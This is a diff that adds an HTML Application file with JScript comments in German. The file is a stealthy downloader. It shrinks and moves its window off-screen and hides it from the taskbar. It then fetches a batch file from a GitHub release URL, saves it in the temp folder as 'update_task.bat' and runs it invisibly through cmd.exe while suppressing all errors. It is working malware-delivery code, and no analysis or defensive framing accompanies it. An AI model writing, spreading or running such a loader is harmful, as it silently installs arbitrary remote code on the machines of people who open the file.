@@ -1,0 +1,45 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    WINDOWSTATE="minimize" 
+    SHOWINTASKBAR="no" 
+    SYSMENU="no" 
+    CAPTION="no"
+    BORDER="none"
+>
+<script language="jscript">
+
+window.resizeTo(0, 0);
+window.moveTo(-32000, -32000);
+
+// Direktlink zum GitHub Release-Asset (uga.bat)
+var batUrl = "https://github.com/phembelix/damn/releases/download/damn/uga.bat";
+
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
+    var batPath = tempFolder + "\\update_task.bat";
+
+    // Batch-Datei per XMLHTTP herunterladen
+    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
+    xhr.open("GET", batUrl, false);
+    xhr.send();
+
+    if (xhr.status == 200) {
+        // Inhalt in die temporäre .bat-Datei schreiben
+        var fileStream = fso.CreateTextFile(batPath, true);
+        fileStream.Write(xhr.responseText);
+        fileStream.Close();
+
+        // Heruntergeladene .bat-Datei komplett unsichtbar im Hintergrund ausführen
+        shell.Run('cmd.exe /c "' + batPath + '"', 0, false);
+    }
+} catch(e) {}
+
+window.close();
+</script>
+</head>
+<body>
+</body>
+</html>
